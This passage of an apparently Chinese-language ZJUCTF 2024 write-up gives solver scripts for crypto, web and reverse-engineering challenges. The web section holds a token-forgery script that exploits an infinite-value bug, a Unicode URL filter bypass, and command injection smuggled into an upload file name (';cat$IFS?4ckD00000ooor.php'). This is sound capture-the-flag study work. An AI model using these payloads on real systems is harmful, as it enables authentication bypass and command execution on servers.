class="hljs-number">28269560384960198129459464824168904454093533799427373719101958152830149304079535609840503045418817577271339506559708826732505096765044117971395637414798033477281664349092452395201698366996248139565797081925288330110757163731306944864404131792462548050708767759391940119750713119508122181663178044139268149581082597178199687276079353808439331728293658408631700475635429921342830354715878323660002459279064928181750787407060944131659356624300053929897005824524609929688237355990980427613559070550439812162019187800018233621385797936453990170736247405871997771020602086874659014802758833220985543027634931320965118936782</span>, <span class="hljs-number">10625741788931007858303888830659148422354013378542985927696595777152340414854015279971842010883421053720353641812187868653213235312353892555970563177558988599107933633340735864486222364110270557367311389846076836771083415281846163998654380752623282253778094553911643806578968196883934713435987257460863616962447383892032157500229307681280131430912764656808726260928234722038626955873788364902558250972328382020856810352543862191220046884387107630101992556872008805981866862802982658955378648983437460740234334042235547472682932431773316024845941192812705881982892857027525142349379964285721568460303629823752967342887</span>, <span class="hljs-number">466513131390636645643900269891214946444047706245650824135253103614265978612953404725019381500993893845145617053401585161990958374796943199099538435861351496258557099896861385401969983387062345279712657806192329411762748881795342790969236194712072681142002072072680828453443357328016687844228861613794298560379205793274077841700937160925811964857910585432339248824064598338134101699312973992616278479768665180694250521743161214366283362781594396414837969921707567615116413598691531290859926550159099552968634136977992540573210466243951997484516747810672360389301753992051382855018984004441058675996738943205371672373</span>, <span class="hljs-number">30013758663076066877713479338691268354899117645445901521662513922052773749395722214090463347248196981868060239786749190266829133470588046958650363148592192357743453783999383200266694850576232013366482175580400126504924153112985830671791571729150276552617782355703038489520393441340713706112576543244470787929038348393779800947179266079330697886117577995873112270474905451612688195298847844226775663235117316316233884464539170131705812430540592713821720299545018169679141879516593359119078495699996765358693970850371204734231497643516531729414382001386014762945378114870937450813766645634470171843375886718590614087224</span>]<br>A = Matrix([<br>    [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">0</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">1</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">2</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">3</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">4</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,-n],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,-s]<br>    ]<br>)<br>B = A.LLL()<br><span class="hljs-built_in">print</span>(B)<br>x = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>][:<span class="hljs-number">5</span>]]<br>new_s = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ai = a[i]<br>    xi = x[i]<br>    new_s += ai * xi<br><span class="hljs-built_in">print</span>(new_s%n == s)<br>ans = sha256(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x]).encode()).hexdigest()<br>flag = <span class="hljs-string">f&quot;ZJUCTF&#123;&#123;<span class="hljs-subst">&#123;ans&#125;</span>&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/29.png" srcset="/img/loading.gif" lazyload></p></li>
</ul>
<h2 id="fib1">fib1</h2>
<ul>
<li>根据题目<span class="math display">\[ f(n,p)= (F(n) \% p, F(n+1) \% p) \]</span> 只要利用好斐波那契数列的性质就可以解决；</li>
<li>知道 $ F(a+b) = F(b) F(a+1) + F(b-1) F(a)$ 就可以根据 $ f(a,p),f(b,p) $ 求 $ f(a+b,p) $；</li>
<li>知道 $F(2n) = F(n) ( 2F(n+1) - F(n) ) $ 和 $ F(2n+1) = F(n+1)^2 + F(n)^2 $ 快速倍增就可以根据 $ f(n,p) $ 求 $ f(k n,p) $；</li>
<li>由于 p 是质数，就可以逆向加法过程做减法; <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> is_prime,invert<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">62562</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibadd</span>(<span class="hljs-params">fib1,fib2,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">1</span>]+((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib1[<span class="hljs-number">0</span>])%p,(fib2[<span class="hljs-number">1</span>]*fib1[<span class="hljs-number">1</span>]+fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">0</span>])%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibsub</span>(<span class="hljs-params">fib2,res,p</span>):<br>    fib1 = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">assert</span> is_prime(p)<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">1</span>]-res[<span class="hljs-number">1</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    tmp2 = (((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    fib1[<span class="hljs-number">0</span>] = (invert(tmp2,p)*tmp1)%p<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-res[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    tmp2 = (fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-fib2[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    fib1[<span class="hljs-number">1</span>] = (invert(tmp2,p)*tmp1)%p<br>    <span class="hljs-keyword">return</span> fib1<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmul2</span>(<span class="hljs-params">fib,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib[<span class="hljs-number">0</span>]*(<span class="hljs-number">2</span>*fib[<span class="hljs-number">1</span>]-fib[<span class="hljs-number">0</span>]))%p,(<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>,p)+<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,p))%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmulk</span>(<span class="hljs-params">fib,k,p</span>):<br>    res = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    now = fib.copy()<br>    <span class="hljs-keyword">while</span> k!=<span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># print(now,res,k,k%2)</span><br>        <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span>:<br>            res = fibadd(res,now,p)<br>        now = fibmul2(now,p)<br>        k = k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;now running : <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">f&quot;Round <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/10&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;now you know:\n&quot;</span>)<br>    p = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;p = &quot;</span>):-<span class="hljs-number">1</span>])<br>    k = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;k = &quot;</span>):-<span class="hljs-number">1</span>])<br>    fib_a = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(a, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    fib_b = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(b, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    io.recv()<br>    fib_ab = fibadd(fib_a,fib_b,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ab[<span class="hljs-number">0</span>]*p+fib_ab[<span class="hljs-number">1</span>]).encode())<br>    io.recv()<br>    fib_ak = fibmulk(fib_a,k,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ak[<span class="hljs-number">0</span>]*p+fib_ak[<span class="hljs-number">1</span>]).encode())<br>    <span class="hljs-keyword">assert</span> fibadd(fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p),fib_a,p)==[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    io.recv()<br>    fib_c = fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_c[<span class="hljs-number">0</span>]*p+fib_c[<span class="hljs-number">1</span>]).encode())<br><br>io.interactive()<br><br><span class="hljs-comment"># ZJUCTF&#123;fibonacci_sequence_mod_n_is_a_kind_of_group&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/33.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h1 id="web"><strong>Web</strong></h1>
<p>还是不太会web的题目，有些题目都是网上有类似题解的🥲</p>
<h2 id="easy-pentest">easy pentest</h2>
<ul>
<li>从<a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/oss/developer-reference/install-ossutil?spm=a2c4g.11186623.0.0.79b841e607DL3S#concept-303829">阿里云</a>下载工具并根据题目文件配置： <img src="/img/zjuctf2024/3.png" srcset="/img/loading.gif" lazyload></li>
<li>运行<code>./ossutil64 cp oss://oss-test-qazxsw/fffffflllllaaaagggg.txt ./</code>得到文件，flag是<code>flag&#123;99b87fa89d7e147c42e709dcd378e03e&#125;</code></li>
</ul>
<h2 id="easy-jwt">easy JWT</h2>
<ul>
<li>仔细看了代码，目标是输入token使得"role"变为"admin"，但是不知道secret，所以没法通过签名检测，我一直想着构造json.load来窃取secret，但是直到看到<a target="_blank" rel="noopener" href="https://rwandi-ctf.github.io/LACTF2024/jason-web-token/">博客</a>发现只要输入很大的age就能使得salted_secret变为<code>inf</code>，于是可以通过检测： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br>secret = <span class="hljs-built_in">int</span>.from_bytes(os.urandom(<span class="hljs-number">128</span>), <span class="hljs-string">&quot;big&quot;</span>)<br>hash_ = <span class="hljs-keyword">lambda</span> a: hashlib.sha256(a.encode()).hexdigest()<br><br>data = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;admin-owo&quot;, &quot;age&quot;: 1e1000, &quot;role&quot;: &quot;admin&quot;, &quot;timestamp&quot;: 1729240220&#125;&#x27;</span><br>userinfo = json.loads(data)<br>salted_secret = (secret ^ userinfo[<span class="hljs-string">&quot;timestamp&quot;</span>]) + userinfo[<span class="hljs-string">&quot;age&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>))<br>signature = hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><br>payload = data.encode().<span class="hljs-built_in">hex</span>() + <span class="hljs-string">&quot;.&quot;</span> + signature<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://55a4ef54.r23.cpolar.top/img&quot;</span>  <span class="hljs-comment">#内网穿透地址</span><br>cookies = &#123;<br>    <span class="hljs-string">&quot;token&quot;</span>: payload<br>&#125;<br>response = requests.get(url, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.content)<br><span class="hljs-comment"># ZJUCTF&#123;COOKI3_dE$i9n_5HOU1d_fo1low_BEs7_PR@cT1Ce|5Ry_F0r_unExPeCT3D_s0lVe_T.T&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/22.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="shanque">shanque</h2>
<ul>
<li>目标是在url的框内输入<code>http://here-is.your.flaaaaa4g.url</code>，但是代码对url进行了过滤，不能有重复字符，且不能有<code>here-is.your.flaaaaa4g.url</code>，于是就想到了unicode的特殊字符会被url正确解析: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> normalize<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br>target = <span class="hljs-string">&quot;http://here-is.your。flaaaaa4g。url&quot;</span><br><br>lst = <span class="hljs-built_in">list</span>(target)<br>dic = defaultdict(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x110000</span>):<br>        <span class="hljs-keyword">if</span> normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">chr</span>(i)) == char:<br>            dic[char].append(<span class="hljs-built_in">chr</span>(i))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dic[char]) &gt; <span class="hljs-number">9</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(dic)<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:<br>    res+=dic[i][<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">del</span> dic[i][<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure></li>
<li>在本地跑发现url前面五个字符不能为特殊字符，于是就想到了大小写绕过，构造出payload：<code>HtTp:ₕᵉʳₑ﹣ᵢſ．ʸºᵘᵣ｡ᶠˡªᵃₐⓐａ⁴ᵍ。ᵤⓡₗ</code> <img src="/img/zjuctf2024/43.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="upload">upload</h2>
<ul>
<li>首先打开网页，发现被重定向到微信公众号，用burpsuite抓包，跳出一开始的网址重定向： <img src="/img/zjuctf2024/44.png" srcset="/img/loading.gif" lazyload></li>
<li>发现有个upload界面，可以上传图片，通过更改文件名等手段，发现对文件类型的检测是由文件头决定的，跟文件名后缀无关，这时候到这就卡住了，因为就算上传木马图片也不知道图片路径，可能存到系统的某个文件夹下面，并不是在网页上可以访问的；</li>
<li>后来问了出题人，他让我多上传点不一样的图片试试，接着我就发现了可疑的地方，上传到某张图片时突然网页返回了<code>special char found in the file name.</code>，网页竟然检测了文件名，这就很匪夷所思。于是我不停的修改文件名，终于！
<ul>
<li>正常的上传图片是这样的： <img src="/img/zjuctf2024/45.png" srcset="/img/loading.gif" lazyload></li>
<li>文件名为空会报这个错: <img src="/img/zjuctf2024/46.png" srcset="/img/loading.gif" lazyload></li>
<li>文件名为<code>/</code>会报这个错: <img src="/img/zjuctf2024/47.png" srcset="/img/loading.gif" lazyload></li>
<li>文件名为<code>'</code>会返回空: <img src="/img/zjuctf2024/48.png" srcset="/img/loading.gif" lazyload></li>
<li>为什么会返回空呢，难道执行了什么指令？是SQL/PHP，还是SHELL？于是我又尝试了各种文件名，直到输入<code>;ls</code>时发现竟然有结果： <img src="/img/zjuctf2024/49.png" srcset="/img/loading.gif" lazyload></li>
</ul></li>
<li>看到了这道题的目标，就是拿到<code>b4ckD00000ooor.php</code>里面的内容，再梳理整个思路，猜测出题人是将这张图片存到了系统的某个地方，最后在网站上返回图片时，是用类似shell的指令读取了该路径的文件内容并进行base64编码再返回的;</li>
<li>但是出题人限制了空格，也限制了一对<code>$$</code>，也不能用<code>$IFS$9</code>绕过;</li>
<li>尝试多次后发现可以用通配符<code>?</code>绕过，使用<code>;cat$IFS?4ckD00000ooor.php</code>，拿到flag(ZJUCTF{Ye5_We1l_inj3C.t10N!!})： <img src="/img/zjuctf2024/50.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h1 id="reverse"><strong>Reverse</strong></h1>
<p>会做的reverse题都算比较简单的送分题🫥</p>
<h2 id="rev1">rev1</h2>
<ul>
<li>打开亲爱的ida大人，看到关键比较代码（其中v9[i+27]是你输入的数据） <img src="/img/zjuctf2024/12.png" srcset="/img/loading.gif" lazyload></li>
<li>那么简单了，打开gdb将断点设在比较语句，看寄存器内的值就行了。图方便我还用patch大法把return 0相关汇编改成了nop，这下错了也不会退出程序了: <img src="/img/zjuctf2024/13.png" srcset="/img/loading.gif" lazyload> <img src="/img/zjuctf2024/14.png" srcset="/img/loading.gif" lazyload></li>
<li>用gdb解出flag： <img src="/img/zjuctf2024/15.png" srcset="/img/loading.gif" lazyload> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x7d</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;rev_is_fun_right?&#125;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="rev2">rev2</h2>
<ul>
<li>放到ida里查看，其余都是简单的对列表内的值加加减减的操作并比较，关键在于das指令: <img src="/img/zjuctf2024/19.png" srcset="/img/loading.gif" lazyload></li>
</ul>

    <div class="fold">
      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6e7dedfa" role="button" aria-expanded="false" aria-controls="collapse-6e7dedfa">
        <div class="fold-arrow">▶</div> das 的操作步骤
      </div>
      <div class="fold-collapse collapse" id="collapse-6e7dedfa">
        <div class="fold-content">
          <ul><li>目标场景：当你使用 SUB 指令对两个 BCD 数进行减法运算时，结果可能不是一个有效的 BCD 码。das 指令用于纠正这种情况。</li><li>调整规则：<ul><li>如果 AL（累加寄存器的低 8 位）中的低 4 位（即个位）大于 9，或者辅助进位标志（AF）置位，则 AL 减去 6，调整个位。</li><li>如果 AL 的高 4 位（即十位）大于 9，或者进位标志（CF）置位，则 AL 减去 0x60，调整十位。</li></ul></li></ul>
        </div>
      </div>
    </div>
<ul>
<li>模拟AL的改变规则，编写脚本得到flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br>numbers = [<br>    <span class="hljs-number">0x30231E3C</span>, <span class="hljs-number">0x794D0D52</span>, <span class="hljs-number">0xDB4F3D42</span>, <span class="hljs-number">0x2FB3FF</span>, <span class="hljs-number">0x4F323E1F</span>, <span class="hljs-number">0xA4A33E52</span>,<br>    <span class="hljs-number">0x8F21</span>, <span class="hljs-number">0xD19B8275</span>, <span class="hljs-number">0x36A6BBF6</span>, <span class="hljs-number">0x7FB1E8AC</span>, <span class="hljs-number">0x19B867B0</span>, <span class="hljs-number">0x7383FB6</span>, <br>    <span class="hljs-number">0x5283BD2E</span>, <span class="hljs-number">0xFFF5</span>, <span class="hljs-number">0xE4CDA88D</span>, <span class="hljs-number">0xCECEEEF8</span>, <span class="hljs-number">0x6EBF11CF</span>, <span class="hljs-number">0x4B50B9B8</span>, <br>    <span class="hljs-number">0x286B6DBE</span>, <span class="hljs-number">0xB3F3EB41</span>, <span class="hljs-number">0x87F5</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">n2l</span>(<span class="hljs-params">li</span>):<br>    new = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>        tmp = i<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            new.append(tmp%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>))<br>            tmp = tmp&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> new<br>lis1 = n2l(numbers[:<span class="hljs-number">7</span>])[:<span class="hljs-number">26</span>]<br>lis2 = n2l(numbers[<span class="hljs-number">7</span>:<span class="hljs-number">14</span>])[:<span class="hljs-number">26</span>]<br>lis3 = n2l(numbers[<span class="hljs-number">14</span>:])[:<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis1])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis2])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis3])<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">das</span>(<span class="hljs-params">al,af,cf</span>):<br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0x0F</span>) &gt; <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> af:<br>        al -= <span class="hljs-number">0x06</span><br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0xF0</span>) &gt; <span class="hljs-number">0x90</span> <span class="hljs-keyword">or</span> cf:<br>        al -= <span class="hljs-number">0x60</span><br>    <span class="hljs-keyword">return</span> al &amp; <span class="hljs-number">0xFF</span><br><br>flag  = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string.printable:<br>        AL = (<span class="hljs-built_in">ord</span>(j)-lis1[i])%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        af,cf = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">ord</span>(j)&amp;<span class="hljs-number">0xf</span>)-(lis1[i]&amp;<span class="hljs-number">0xf</span>))&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(j)-lis1[i])&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>        <span class="hljs-comment"># print(af,cf)</span><br>        AL = das(AL,af,cf)<br>        res = (lis2[i]+AL)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> res==lis3[i]:<br>            flag+=j<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># ZJUCTF&#123;welc0me-2-reverse!&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/20.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="rev3">rev3</h2>
<ul>
